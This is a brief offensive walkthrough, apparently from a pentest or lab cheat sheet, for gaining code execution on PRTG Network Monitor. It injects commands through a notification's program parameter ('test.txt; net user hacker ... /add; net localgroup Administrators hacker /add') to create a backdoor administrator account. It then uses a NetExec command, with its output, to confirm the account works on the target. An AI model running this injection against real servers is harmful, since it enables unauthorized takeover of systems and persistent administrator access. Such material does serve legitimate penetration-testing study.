# Attacking PRTG Network Monitor

## RCE

1. Setup
2. Account Settings
3. Notifications
4. Add new notification
5. Basic Notification Settings
    * Notification Name: Test notification
    * Status: Started
6. Execute Program
    * Program File: Demo exe notification - outfile.ps1
    * Parameter: test.txt; net user hacker P@ssw0rd /add; net localgroup Administrators hacker /add
7. Save
8. Send test notification

## [Confirming](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain) the Access

```sh
my@attack:~$ nxc smb 10.129.136.234 -u 'hacker' -p 'P@ssw0rd'
```

```output title="Output"
SMB         10.129.136.234  445    APP03            [*] Windows 10 / Server 2019 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.136.234  445    APP03            [+] APP03\hacker:P@ssw0rd (Pwn3d!)
```
